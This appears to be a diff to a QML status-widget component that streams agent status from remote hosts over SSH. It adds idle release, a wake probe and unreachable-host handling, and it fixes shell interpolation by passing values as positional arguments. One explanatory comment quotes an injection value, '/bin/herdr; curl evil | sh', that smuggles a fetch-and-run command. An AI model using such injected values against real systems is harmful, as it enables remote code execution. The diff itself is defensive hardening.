@@ -49,6 +49,15 @@ QtObject {
   property bool streaming: false
   property bool stale: false
 
+  // Released after sustained emptiness. Distinct from !desiredRunning: intent
+  // is unchanged, so any sign of life re-opens the channel.
+  property bool idling: false
+
+  // How long a host may be unreachable before its pots are dropped. Retrying
+  // forever while showing stale pots is the failure mode that matters most.
+  readonly property int lostAfterMs: 120000
+  property double unreachableSince: 0
+
   // Backoff, autossh's shape: a channel that dies within the gate is treated
   // as a persistent failure rather than something to retry tightly.
   readonly property int gateMs: 30000
@@ -67,6 +76,10 @@ QtObject {
   // NOT `agentsChanged` — QML reserves <prop>Changed for property signals.
   signal snapshotAgents(var list)
   signal down()
+  // Raised when this host has been unreachable long enough that its pots can
+  // no longer be trusted. A status widget showing stale state is worse than
+  // one showing nothing.
+  signal lost()
 
   function log(msg) { console.warn("kettle[" + host + "]: " + msg) }
 
@@ -75,7 +88,7 @@ QtObject {
   // a startup race: herdrPath arrives asynchronously from the token loader, so
   // at Component.onCompleted it is still empty. Refusing to start there would
   // strand the channel until something else nudged it.
-  readonly property bool canRun: masterAlive && herdrPath.length > 0
+  readonly property bool canRun: masterAlive && herdrPath.length > 0 && !idling
 
   function start() { desiredRunning = true }
   onCanRunChanged: {
@@ -137,12 +150,20 @@ QtObject {
     // stdout passes through the line guard so a remote emitting megabytes
     // without a newline kills a disposable child rather than growing the
     // shell's heap — SplitParser has no buffer cap.
+    // Values are passed as POSITIONAL ARGUMENTS, never interpolated into the
+    // script text. herdrPath in particular is probed from the remote host, so
+    // interpolating it would hand a compromised host code execution here —
+    // `command -v herdr` returning "/bin/herdr; curl evil | sh" would run.
+    // The host name comes from a token filename and deserves the same care.
     command: [
       "bash", "-c",
-      "ssh -o BatchMode=yes -o ControlMaster=no -o ControlPath=" + Quickshell.env("HOME") + "/.ssh/cm-%r@%h:%p" +
-      " -o ServerAliveInterval=30 -o ServerAliveCountMax=2 -o ConnectTimeout=10 " +
-      root.host + " 'KETTLE_HERDR=" + root.herdrPath + " bash -s' < " +
-      root.pluginDir + "bin/kettle-herdr-stream.sh | " +
+      'ssh -o BatchMode=yes -o ControlMaster=no -o ControlPath="$HOME/.ssh/cm-%r@%h:%p" ' +
+      '-o ServerAliveInterval=30 -o ServerAliveCountMax=2 -o ConnectTimeout=10 ' +
+      '-- "$1" "KETTLE_HERDR=$2 bash -s" < "$3" | "$4"',
+      "kettle-channel",           // $0
+      root.host,                  // $1
+      root.herdrPath,             // $2
+      root.pluginDir + "bin/kettle-herdr-stream.sh",
       root.pluginDir + "bin/kettle-line-guard"
     ]
 
@@ -156,12 +177,14 @@ QtObject {
 
     onStarted: {
       root.streaming = true
+      root.unreachableSince = 0
       root.startedAt = Date.now()
       root.lastLine = Date.now()
     }
 
     onExited: function(code, status) {
       root.streaming = false
+      if (root.unreachableSince === 0) root.unreachableSince = Date.now()
       var lived = Date.now() - root.startedAt
 
       // Lived past the gate: treat as a transient drop and retry promptly.
@@ -200,12 +223,55 @@ QtObject {
     }
   }
 
+  // One-shot probe while idling: does this host have agents again? Costs one
+  // multiplexed round trip a minute, and only while released.
+  property Process wake: Process {
+    command: ["ssh", "-o", "BatchMode=yes", "-o", "ControlMaster=no",
+              "-o", "ControlPath=" + Quickshell.env("HOME") + "/.ssh/cm-%r@%h:%p",
+              "-o", "ConnectTimeout=8", "--", root.host,
+              (root.herdrPath || "herdr") + " agent list"]
+    stdout: StdioCollector {
+      waitForEnd: true
+      onStreamFinished: {
+        try {
+          var d = JSON.parse(String(text || "{}"))
+          var list = (d.result && d.result.agents) ? d.result.agents : []
+          var live = list.filter(function(a) {
+            return a && a.agent_status && a.agent_status !== "idle"
+          })
+          if (live.length > 0) {
+            root.log("agents active again, re-opening channel")
+            root.idling = false
+          }
+        } catch (e) { /* unreachable or malformed: stay idle */ }
+      }
+    }
+  }
+
   property Timer supervisor: Timer {
     interval: 5000
     running: true
     repeat: true
     onTriggered: {
       if (!root.check.running) root.check.running = true
+
+      // A host that is partitioned, suspended, or asleep emits neither a
+      // snapshot nor a down marker — so neither reconcile nor `down` can
+      // clear its pots. Without this they would sit on the bar, possibly
+      // still ticking as "simmering", until the shell reloaded.
+      if (!root.streaming && root.unreachableSince > 0
+          && Date.now() - root.unreachableSince > root.lostAfterMs) {
+        root.log("unreachable for 2m, dropping its pots")
+        root.lost()
+        root.unreachableSince = Date.now()   // re-arm rather than repeat-fire
+      }
+
+      // Any sign of life ends an idle release.
+      if (root.idling && root.masterAlive && root.herdrPath.length > 0) {
+        // Cheap re-probe: if the host has agents again, re-open.
+        if (!root.wake.running) root.wake.running = true
+      }
+
       // Capability may have arrived after start(); pick it up here too.
       if (root.desiredRunning && root.canRun && !root.chan.running && !root.retry.running)
         root.chan.running = true
@@ -223,9 +289,15 @@ QtObject {
       }
 
       // Stop pinning the user's ControlMaster when there is nothing to watch.
+      // `idle` is a RELEASE, not a shutdown: desiredRunning stays true so the
+      // capability signals re-open the channel the moment the host is usable
+      // again. Clearing desiredRunning here would silently kill the feature
+      // for the rest of the shell's life.
       if (root.emptySince > 0 && Date.now() - root.emptySince > root.idleTeardownMs) {
         root.log("no agents for 10m, releasing channel")
-        root.stop()
+        root.idling = true
+        root.emptySince = 0
+        if (root.chan.running) root.chan.running = false
       }
     }
   }
